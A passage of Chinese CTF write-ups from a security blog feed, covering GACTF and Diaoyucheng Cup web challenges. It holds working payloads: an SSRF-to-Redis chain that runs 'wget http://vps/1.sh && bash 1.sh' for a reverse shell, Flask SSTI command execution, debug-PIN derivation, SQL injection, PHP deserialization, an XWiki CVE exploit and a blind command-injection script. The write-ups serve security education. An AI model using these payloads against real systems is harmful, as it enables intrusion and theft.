rel="external">https://github.com/xmsec/redis-ssrf</a></p><p>修改成http方式的，payload如下</p><pre><code>http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:5000@1.1.1.1/?url=http://127.0.0.1:6379?%250D%250A%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252414%250D%250Avps%250D%250A%25244%250D%250A7777%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A/tmp/%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A/tmp/exp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252444%250D%250Awget%2520http%253A//vps/1.sh%2520%2526%2526%2520bash%25201.sh%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A</code></pre><p>反弹shell，获取flag（试了好几次才反弹到==）</p><p><img src="http://pic.c1imber.top/blog/20200831/4x1E4jxXir0f.png?imageslim" alt="mark"></p><h2 id="补充几道赛后做的题："><a href="#补充几道赛后做的题：" class="headerlink" title="补充几道赛后做的题："></a>补充几道赛后做的题：</h2><h3 id="simpleflask"><a href="#simpleflask" class="headerlink" title="simpleflask"></a>simpleflask</h3><p><a href="http://124.70.153.63/" target="_blank" rel="external">http://124.70.153.63/</a></p><p>POST访问后提示request.form[“name”]，传入name进行测试，发现存在flask ssti,但是禁用了一些字符，构造以下payload获取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/FLAG"</span>.lower()).read()&#125;&#125;</div></pre></td></tr></table></figure><p>绕过：</p><p><code>(&#39;-&gt;&quot;、/flag-&gt;&quot;/FLAG&quot;.lower())</code></p><p><img src="http://pic.c1imber.top/blog/20200831/qDy2NxPifNAO.png?imageslim" alt="mark"></p><p><strong>题目延申思考</strong></p><p>寻找执行命令的链，寻找os模块</p><p><img src="http://pic.c1imber.top/blog/20200902/l5XkcrMPiYXd.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200902/taD9qKARIjsh.png?imageslim" alt="mark"></p><p>可以找到很多，比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">304</span>].__init__.__globals__[<span class="string">"OS"</span>.lower()][<span class="string">"POPEN"</span>.lower()](<span class="string">"WHOAMI"</span>.lower()).read()&#125;&#125;</div></pre></td></tr></table></figure><p>再缩短一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">304</span>].__init__.__globals__[<span class="string">"o"</span><span class="string">"s"</span>][<span class="string">"po"</span><span class="string">"pen"</span>](<span class="string">"whoami"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200902/FF9xOHjDMVYU.png?imageslim" alt="mark"></p><p>虽然可以执行命令，但是还过滤了空格</p><p>构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">304</span>].__init__.__globals__[<span class="string">"o"</span><span class="string">"s"</span>][<span class="string">"po"</span><span class="string">"pen"</span>](char(<span class="number">32</span>).join(<span class="string">"lsz/"</span>.split(<span class="string">"z"</span>))).read()&#125;&#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200902/WkBjq1iCcUSL.png?imageslim" alt="mark"></p><p>但是这里显示char不存在，所以暂时没办法绕过（对flask还不是太熟悉，不知道什么原因）</p><p><strong>关于这道题看了write补充一下：</strong></p><p>看了其他师傅和官方的wp，得知这道题还可以通过任意文件读取+获取pin码进入debug调试模式执行python代码读取flag</p><p>读取题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/home/ctf/app.py"</span>).read().upper()&#125;&#125;</div></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FROM FLASK IMPORT FLASK, REQUEST, RENDER_TEMPLATE_STRING, REDIRECT, ABORT IMPORT STRING APP = FLASK(__NAME__) WHITE_LIST = STRING.ASCII_LETTERS + STRING.DIGITS + <span class="string">'()_-&#123;&#125;."[]=/'</span> BLACK_LIST = [<span class="string">"CODECS"</span>, <span class="string">"SYSTEM"</span>, <span class="string">"FOR"</span>, <span class="string">"IF"</span>, <span class="string">"END"</span>, <span class="string">"OS"</span>, <span class="string">"EVAL"</span>, <span class="string">"REQUEST"</span>, <span class="string">"WRITE"</span>, <span class="string">"MRO"</span>, <span class="string">"COMPILE"</span>, <span class="string">"EXECFILE"</span>, <span class="string">"EXEC"</span>, <span class="string">"SUBPROCESS"</span>, <span class="string">"IMPORTLIB"</span>, <span class="string">"PLATFORM"</span>, <span class="string">"TIMEIT"</span>, <span class="string">"IMPORT"</span>, <span class="string">"LINECACHE"</span>, <span class="string">"MODULE"</span>, <span class="string">"GETATTRIBUTE"</span>, <span class="string">"POP"</span>, <span class="string">"GETITEM"</span>, <span class="string">"DECODE"</span>, <span class="string">"POPEN"</span>, <span class="string">"IFCONFIG"</span>, <span class="string">"FLAG"</span>, <span class="string">"CONFIG"</span>] DEF CHECK(S): <span class="comment"># PRINT(LEN(S)) IF LEN(S) &gt; 131: ABORT(500, "HACKER") # ABORT(500, "HACKER LEN") FOR I IN S: IF I NOT IN WHITE_LIST: ABORT(500, "HACKER") # ABORT(500, "HACKER WHITE") FOR I IN BLACK_LIST: IF I IN S: ABORT(500, "HACKER") # ABORT(500, "HACKER BLACK") @APP.ROUTE('/', METHODS=["POST"]) DEF HELLO_WORLD(): TRY: NAME = REQUEST.FORM["NAME"] EXCEPT EXCEPTION: RETURN RENDER_TEMPLATE_STRING("&lt;H1&gt;REQUEST.FORM[\"NAME\"]&lt;H1&gt;") IF NAME == "": RETURN RENDER_TEMPLATE_STRING("&lt;H1&gt;HELLO WORLD!&lt;H1&gt;") CHECK(NAME) TEMPLATE = '&lt;H1&gt;HELLO &#123;&#125;!&lt;H1&gt;'.FORMAT(NAME) RES = RENDER_TEMPLATE_STRING(TEMPLATE) IF "FLAG" IN RES: ABORT(500, "HACKER") RETURN RES IF __NAME__ == '__MAIN__': APP.RUN(HOST="0.0.0.0", DEBUG=TRUE) !</span></div></pre></td></tr></table></figure><p>可以看到过滤了哪些东西，并且可以看到这里flask是debug起的</p><p>读取mac地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/sys/class/net/eth0/address"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p><code>02:42:ac:14:00:0b</code></p><p>转为10进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="number">0x0242ac14000b</span></div><div class="line"><span class="number">2485378088971</span></div></pre></td></tr></table></figure><p>机器id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/etc/machine-id"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p>a8eb6cac33e701ae867269db5ce80e7f</p><p>新的machine-id要加上cgroup</p><p>于是读取/proc/self/cgroup并提取里面的id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/proc/self/cgroup"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p>52833efbb53e157ffd26a035d647ff1a1902fe648113ae6b0799af212f1966d0</p><p>拼接</p><p>a8eb6cac33e701ae867269db5ce80e7f52833efbb53e157ffd26a035d647ff1a1902fe648113ae6b0799af212f1966d0</p><p>脚本来自kingkk师傅 (<a href="https://xz.aliyun.com/t/2553）" target="_blank" rel="external">https://xz.aliyun.com/t/2553）</a></p><p>得到pin码</p><p>742-613-872</p><p>进入debug模式，执行任意python代码</p><p><img src="http://pic.c1imber.top/blog/20200903/vs7HlRFgsaJ1.png?imageslim" alt="mark"></p><p>(需要花时间研究总结一下ssti了，姿势太多)</p><h3 id="carefuleyes"><a href="#carefuleyes" class="headerlink" title="carefuleyes"></a>carefuleyes</h3><p>下载www.zip进行代码审计</p><p>发现一处二次注入</p><p>在rename.php,在出库时没有对数据库当中的$result[‘filename’]进行转义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$info = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$result['filename']&#125;'"</span>);</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200903/uyicsJ7uIJEC.png?imageslim" alt="mark"></p><p>可控输入：upload.php当中的<code>basename(pathinfo($_FILES[&quot;upfile&quot;][&#39;name&#39;]))[&#39;filename&#39;]</code>可以作为二次注入的注入点，这里转义入库，在出库时发生注入</p><p><img src="http://pic.c1imber.top/blog/20200903/XtdHAY1NRtd0.png?imageslim" alt="mark"></p><p>构造<code>filename=&quot;1&#39; and 1=2 union select 1,group_concat(username,0x3a,password),3,4,5 from user#.jpg&quot;</code></p><p><img src="http://pic.c1imber.top/blog/20200903/kss5lpAg8bqO.png?imageslim" alt="mark"></p><p>接着访问rename，在old filename处传入<code>1&#39; and 1=2 union select 1,group_concat(username,0x3a,password),3,4,5 from user#</code>，触发二次注入</p><p><img src="http://pic.c1imber.top/blog/20200903/Q17Ycr0fdunw.png?imageslim" alt="mark"></p><p>获得数据库username和password为XM和qweqweqwe</p><p>upload.php存在<code>unserialize($_GET[&quot;data&quot;]);</code>，构造payload触发这里的反序列化，获取flag</p><p>payload</p><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">XCTFGG</span></span>&#123;</div><div class="line">    <span class="keyword">private</span> $method;</div><div class="line">    <span class="keyword">private</span> $args;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;method = $method;</div><div class="line">        <span class="keyword">$this</span>-&gt;args = $args;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$userinfo=<span class="keyword">array</span>(<span class="string">"XM"</span>,<span class="string">"qweqweqwe"</span>);</div><div class="line">$obj=<span class="keyword">new</span> XCTFGG(<span class="string">"login"</span>,$userinfo);</div><div class="line"><span class="keyword">echo</span> serialize($obj);</div></pre></td></tr></table></figure><p>result:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">6</span>:<span class="string">"XCTFGG"</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">"XCTFGGmethod"</span>;s:<span class="number">5</span>:<span class="string">"login"</span>;s:<span class="number">12</span>:<span class="string">"XCTFGGargs"</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">2</span>:<span class="string">"XM"</span>;i:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">"qweqweqwe"</span>;&#125;&#125;</div></pre></td></tr></table></figure><p>因为这里类的属性是private，当中有不可见字符，需要修改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">6</span>:<span class="string">"XCTFGG"</span>:<span class="number">2</span>:&#123;S:<span class="number">14</span>:<span class="string">"\00XCTFGG\00method"</span>;s:<span class="number">5</span>:<span class="string">"login"</span>;S:<span class="number">12</span>:<span class="string">"\00XCTFGG\00args"</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">2</span>:<span class="string">"XM"</span>;i:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">"qweqweqwe"</span>;&#125;&#125;</div></pre></td></tr></table></figure><p>最终构造上传数据包获取flag</p><pre><code>POST /upload.php?data=O%3A6%3A%22XCTFGG%22%3A2%3A%7BS%3A14%3A%22%5C00XCTFGG%5C00method%22%3Bs%3A5%3A%22login%22%3BS%3A12%3A%22%5C00XCTFGG%5C00args%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A2%3A%22XM%22%3Bi%3A1%3Bs%3A9%3A%22qweqweqwe%22%3B%7D%7D HTTP/1.1Host: 202.182.118.236User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------406950059833807422084179561779Content-Length: 228Origin: http://202.182.118.236Connection: closeReferer: http://202.182.118.236/Upgrade-Insecure-Requests: 1    -----------------------------406950059833807422084179561779Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;getflag.jpg&quot;Content-Type: image/jpeg    111-----------------------------406950059833807422084179561779--</code></pre><p><img src="http://pic.c1imber.top/blog/20200903/dBNtMGL6uSww.png?imageslim" alt="mark"></p><h3 id="XWiki"><a href="#XWiki" class="headerlink" title="XWiki"></a>XWiki</h3><p>CVE-2020-11057</p><p><a href="https://www.anquanke.com/vul/id/2024692" target="_blank" rel="external">https://www.anquanke.com/vul/id/2024692</a></p><p>根据漏洞描述，需要注册账号，然后在编辑个人仪表板的位置可以执行python或groovy代码</p><p>影响版本：</p><p>XWiki Platform 7.2版本至11.10.2版本</p><p>而目标为11.10.1</p><p><a href="http://119.3.111.133:1234/bin/edit/XWiki/Adm1nAdm1n?editor=inline&amp;category=dashboard" target="_blank" rel="external">http://119.3.111.133:1234/bin/edit/XWiki/Adm1nAdm1n?editor=inline&amp;category=dashboard</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">print</span> os.popen(<span class="string">'ls /'</span>).read()</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200903/9sU51BthkwiS.png?imageslim" alt="mark"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">print</span> os.popen(<span class="string">'/readflag'</span>).read()</div></pre></td></tr></table></figure><p>直接执行这个二进制文件不行，一直显示比较数字大小</p><p><img src="http://pic.c1imber.top/blog/20200903/WRrOU06HsHW1.png?imageslim" alt="mark"></p><p>写个交互</p><p>readflag.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE</div><div class="line">p=Popen(<span class="string">"./readflag"</span>,stdin=PIPE,stdout=PIPE,stderr=PIPE)</div><div class="line"><span class="keyword">print</span> p.stdout.readline()</div><div class="line"><span class="keyword">print</span> p.stdout.readline()</div><div class="line">res=<span class="string">""</span></div><div class="line">s=p.stdout.readline()</div><div class="line"><span class="keyword">while</span> <span class="string">"Which number is bigger?"</span> <span class="keyword">in</span> s:</div><div class="line">    <span class="keyword">print</span> s</div><div class="line">    num0=int(s.split(<span class="string">':'</span>)[<span class="number">0</span>].split(<span class="string">'?'</span>)[<span class="number">1</span>])</div><div class="line">    num1=int(s.split(<span class="string">':'</span>)[<span class="number">1</span>])</div><div class="line">    <span class="keyword">if</span> num0&gt;num1:</div><div class="line">        p.stdin.write(<span class="string">'0\n'</span>)</div><div class="line">        res+=<span class="string">'0'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        p.stdin.write(<span class="string">'1\n'</span>)</div><div class="line">        res+=<span class="string">'1'</span></div><div class="line">    s=p.stdout.readline()</div><div class="line"></div><div class="line"><span class="keyword">print</span> res</div></pre></td></tr></table></figure><p>得到一串二进制字符串</p><p><img src="http://pic.c1imber.top/blog/20200903/Ch5y7143T0vX.png?imageslim" alt="mark"></p><p>转为字符串就是flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">"01100111011000010110001101110100011001100111101101011000010101110110100101101011011010010101111101000011010101100100010101011111011101110110100101110100011010000110111101110101011101000101111101110000011001010111001001101101011010010111001101110011011010010110111101101110010111110111001101100011011100100110100101110000011101000110100101101110011001110101111101100101011110000110010101100011011101010111010001101001011011110110111000100001001000010010000101111101"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>l=[s[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">8</span>)]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(b, <span class="number">2</span>) <span class="keyword">for</span> b <span class="keyword">in</span> l]])</div></pre></td></tr></table></figure><p><code>gactf{XWiki_CVE_without_permission_scripting_execution!!!}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;EZFLASK&quot;&gt;&lt;a href=&quot;#EZFLASK&quot; class=&quot;headerlink&quot; title=&quot;EZFLASK&quot;&gt;&lt;/a&gt;EZFLASK&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://124.70.206.91:10001/&quot; target=&quot;_bla
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020钓鱼城杯writeup</title>
    <link href="https://c1aysec.github.io/2020/08/28/2020%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFwriteup/"/>
    <id>https://c1aysec.github.io/2020/08/28/2020钓鱼城杯writeup/</id>
    <published>2020-08-28T06:46:21.992Z</published>
    <updated>2020-08-28T06:59:34.941Z</updated>
    
    <content type="html"><![CDATA[<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><p>php命令执行无回显、不出网、web目录不可写</p><p>通过<code>php -r &quot;sleep(5)&quot;</code>延时可以判断命令执行成功</p><p>获取/flag.txt</p><p><code>cmd=php -r &quot;if(strlen(file_get_contents(&#39;/flag.txt&#39;))==25){sleep(5);}&quot;</code></p><p><img src="http://pic.c1imber.top/blog/20200828/n7eLgP9axiwK.png?imageslim" alt="mark"></p><p>时间盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line">l=string.maketrans(<span class="string">""</span>,<span class="string">""</span>)[<span class="number">33</span>:<span class="number">127</span>]</div><div class="line"></div><div class="line">flag=<span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> l:</div><div class="line">        paramsPost = &#123;<span class="string">"cmd"</span>:<span class="string">"php -r \"if(substr((file_get_contents('/flag.txt')),%d,1)=='%s')&#123;sleep(5);&#125;\""</span>%(i,j)&#125;</div><div class="line">        headers = &#123;<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,<span class="string">"Cache-Control"</span>:<span class="string">"no-cache"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,<span class="string">"Pragma"</span>:<span class="string">"no-cache"</span>,<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">        start=time.time()</div><div class="line">        response = requests.post(<span class="string">"http://119.3.37.185/index.php"</span>, data=paramsPost, headers=headers)</div><div class="line">        end=time.time()</div><div class="line">        <span class="keyword">if</span> end-start &gt;=<span class="number">5</span>:</div><div class="line">            flag+=j</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200828/dIPIfK9dyRyG.png?imageslim" alt="mark"></p><p><code>flag{kijbvstsbsnsj1d9bc8}</code></p><h3 id="easyseed"><a href="#easyseed" class="headerlink" title="easyseed"></a>easyseed</h3><p>index.bak泄露key和lock生成算法</p><p><img src="http://pic.c1imber.top/blog/20200828/PxlX4MDEwA8A.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$lock = random(<span class="number">6</span>, <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line">$key = random(<span class="number">16</span>, <span class="string">'1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'0123456789ABC'</span>)</span> </span>&#123;</div><div class="line">    $hash = <span class="string">''</span>;</div><div class="line">    $max = strlen($chars) - <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</div><div class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $hash;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>Set-Cookie里给出了lock的值</p><p><img src="http://pic.c1imber.top/blog/20200828/5kUp2V0dPSta.png?imageslim" alt="mark"></p><p>根据lock值爆破seed</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">str1=<span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span></div><div class="line">str2=<span class="string">'vEUHaY'</span></div><div class="line">str3 = str1[::<span class="number">-1</span>]</div><div class="line">length = len(str2)</div><div class="line">res=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</div><div class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</div><div class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></div><div class="line">            <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> res</div></pre></td></tr></table></figure><p>得到<code>21 21 0 51 30 30 0 51 46 46 0 51 33 33 0 51 0 0 0 51 50 50 0 51</code></p><p><code>./php_mt_seed 21 21 0 51 30 30 0 51 46 46 0 51 33 33 0 51 0 0 0 51 50 50 0 51</code></p><p>得到两个seed</p><p><img src="http://pic.c1imber.top/blog/20200828/Wgh5dVVX24cW.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">mt_srand(<span class="number">718225</span>);</div><div class="line"><span class="comment">//mt_srand(4007230629);</span></div><div class="line">$lock = random(<span class="number">6</span>, <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line">$key = random(<span class="number">16</span>, <span class="string">'1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'0123456789ABC'</span>)</span> </span>&#123;</div><div class="line">    $hash = <span class="string">''</span>;</div><div class="line">    $max = strlen($chars) - <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</div><div class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $hash;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">echo</span> $lock;</div><div class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"><span class="keyword">echo</span> $key;</div><div class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</div></pre></td></tr></table></figure><p>选择正确的locl、key</p><p><code>lock=vEUHaY; key=nRtqGR8mtd9ZOPyI;</code></p><p>需要带上X-Forwarded-For: 127.0.0.1请求，才能获取flag==</p><p><img src="http://pic.c1imber.top/blog/20200828/21dIhUgOR2Kz.png?imageslim" alt="mark"></p><h3 id="zblog（完全是队友们做出来的）"><a href="#zblog（完全是队友们做出来的）" class="headerlink" title="zblog（完全是队友们做出来的）"></a>zblog（完全是队友们做出来的）</h3><p><img src="http://pic.c1imber.top/blog/20200828/Cs7pUhq9chBj.png?imageslim" alt="mark"></p><p>发现title存在任意文件读取</p><p><code>http://122.112.253.135/?title=/../../../../../../../etc/passwd</code></p><p><img src="http://pic.c1imber.top/blog/20200828/2HHUGR8gjkma.png?imageslim" 